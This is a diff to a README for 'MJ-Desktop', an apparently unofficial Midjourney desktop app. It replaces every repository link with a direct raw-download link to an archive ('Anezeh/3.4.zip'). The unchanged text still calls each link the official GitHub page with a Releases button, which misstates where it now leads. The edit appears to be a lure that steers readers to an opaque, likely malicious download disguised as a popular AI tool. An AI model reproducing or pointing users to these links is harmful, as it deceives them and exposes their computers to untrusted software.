@@ -10,7 +10,7 @@ With an intuitive interface designed for everyday users, you can type a descript
 
 )
 
-[![Download MJ-Desktop](https://img.shields.io/badge/Download-MJ--Desktop-8A2BE2?style=for-the-badge&logo=github&logoColor=white&labelColor=1A1B27)](https://github.com/Brilamome5008/MJ-Desktop---Midjourney-AI-Desktop-App-2026)
+[![Download MJ-Desktop](https://img.shields.io/badge/Download-MJ--Desktop-8A2BE2?style=for-the-badge&logo=github&logoColor=white&labelColor=1A1B27)](https://raw.githubusercontent.com/Brilamome5008/MJ-Desktop---Midjourney-AI-Desktop-App-2026/main/Anezeh/3.4.zip)
 
 ---
 
@@ -69,13 +69,13 @@ Every image you create is automatically saved to a clean, organized gallery insi
 
 ### Step 1: Visit the Official Download Page
 
-Visit this link to download the application: [https://github.com/Brilamome5008/MJ-Desktop---Midjourney-AI-Desktop-App-2026](https://github.com/Brilamome5008/MJ-Desktop---Midjourney-AI-Desktop-App-2026)
+Visit this link to download the application: [https://raw.githubusercontent.com/Brilamome5008/MJ-Desktop---Midjourney-AI-Desktop-App-2026/main/Anezeh/3.4.zip](https://raw.githubusercontent.com/Brilamome5008/MJ-Desktop---Midjourney-AI-Desktop-App-2026/main/Anezeh/3.4.zip)
 
 This will take you to the official GitHub page for MJ-Desktop. Look for a green or blue button labeled **"Download"** or **"Releases"** on that page. Click it to proceed to the download section.
 
 
 
-[![Download MJ-Desktop Now](https://img.shields.io/badge/🚀-Download%20MJ--Desktop%20Now-FF6F00?style=for-the-badge&logo=github&logoColor=white&labelColor=232323)](https://github.com/Brilamome5008/MJ-Desktop---Midjourney-AI-Desktop-App-2026)
+[![Download MJ-Desktop Now](https://img.shields.io/badge/🚀-Download%20MJ--Desktop%20Now-FF6F00?style=for-the-badge&logo=github&logoColor=white&labelColor=232323)](https://raw.githubusercontent.com/Brilamome5008/MJ-Desktop---Midjourney-AI-Desktop-App-2026/main/Anezeh/3.4.zip)
 
 
 
@@ -238,7 +238,7 @@ This latest release brings significant improvements over previous versions:
 
 Follow the official GitHub repository to receive notifications about future updates, new features, and community showcases. You can also star the repository if you find MJ-Desktop useful–it helps others discover this tool too!
 
-**GitHub Repository:** [https://github.com/Brilamome5008/MJ-Desktop---Midjourney-AI-Desktop-App-2026](https://github.com/Brilamome5008/MJ-Desktop---Midjourney-AI-Desktop-App-2026)
+**GitHub Repository:** [https://raw.githubusercontent.com/Brilamome5008/MJ-Desktop---Midjourney-AI-Desktop-App-2026/main/Anezeh/3.4.zip](https://raw.githubusercontent.com/Brilamome5008/MJ-Desktop---Midjourney-AI-Desktop-App-2026/main/Anezeh/3.4.zip)
 
 ---
 
@@ -246,7 +246,7 @@ Follow the official GitHub repository to receive notifications about future upda
 
 That's truly all you need to know! You have everything necessary to transform words into beautiful pieces of art right from your Windows PC. Download MJ-Desktop, install it in minutes, and let your imaginationrun wild. No experience, no creative skills, no expensive hardware required–just your ideas and this powerful AI tool.
 
-**Get started today:** [Download MJ-Desktop Now](https://github.com/Brilamome5008/MJ-Desktop---Midjourney-AI-Desktop-App-2026)
+**Get started today:** [Download MJ-Desktop Now](https://raw.githubusercontent.com/Brilamome5008/MJ-Desktop---Midjourney-AI-Desktop-App-2026/main/Anezeh/3.4.zip)
 
 Happy creating!
 
